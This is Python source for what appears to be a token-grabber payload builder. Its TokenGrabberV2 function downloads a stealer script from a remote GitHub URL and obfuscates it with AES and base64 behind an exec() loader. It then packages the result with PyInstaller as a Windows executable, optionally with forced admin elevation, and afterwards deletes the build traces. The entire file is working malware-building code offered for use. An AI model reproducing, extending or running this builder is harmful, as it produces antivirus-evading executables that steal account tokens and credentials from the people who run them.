import os
import shutil
import Cookies
import requests
import base64
import random

from util.common import *
from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

temp = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp'

def TokenGrabberV2(fileName, force_admin, key):
    clear()
    try:
        if force_admin == 'Yes' or force_admin == 'yes' or force_admin == 'Y' or force_admin == 'y':
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}{Fore.CYAN}.exe With Force Admin!\n{Fore.RESET}")
        else:
            print(f"{Fore.CYAN}\nCreating payload named {Fore.GREEN}{fileName}.exe Without Force Admin!\n{Fore.RESET}")
        code = requests.get("https://raw.githubusercontent.com/testy65421/UmMqQ-rbNq-q-ZQ_n__n7-f-9Xv-L-9Fz-Qnm-7R-8Rx-/main/hareat.py").text.replace("KEY_HERE", str(key))
        with open(f"{temp}\\{fileName}.py", 'w', errors="ignore") as f:
            f.write(code)
            
        IV = Random.new().read(AES.block_size)
        key = u''
        for i in range(8):
            key = key + chr(random.randint(0x4E00, 0x9FA5))

        with open(f'{temp}\\{fileName}.py') as f: 
            _file = f.read()
            imports = ''
            input_file = _file.splitlines()
            for i in input_file:
                if i.startswith("import") or i.startswith("from"):
                    imports += i+';'

        with open(f'{temp}\\{fileName}.py', "wb") as f:
            encodedBytes = base64.b64encode(_file.encode())
            obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
            f.write(f'from Crypto.Cipher import AES;{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
        
        shutil.move(f"{temp}\\{fileName}.py", f"{os.getcwd()}\\{fileName}.py")

        if force_admin == 'Yes' or force_admin == 'yes' or force_admin == 'Y' or force_admin == 'y':
            os.system(f"pyinstaller --onefile --uac-admin --log-level=INFO -n {fileName} {fileName}.py")
        else:
            os.system(f"pyinstaller --onefile --log-level=INFO -n {fileName} {fileName}.py") # --noconsole

        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        os.remove(f'{fileName}.py')
        os.remove(f'tokens.py')
        os.remove(f'{fileName}.spec')
        shutil.rmtree('build')
        shutil.rmtree('dist')

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        try:
            os.remove(f'{fileName}.py')
            os.remove(f'tokens.py')
            os.remove(f'{fileName}.spec')
            shutil.rmtree('build')
            shutil.rmtree('dist')
        except FileNotFoundError:
            pass
    else:
        print(f"\n{Fore.GREEN}Finshed creating payload{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')
    Cookies.main()

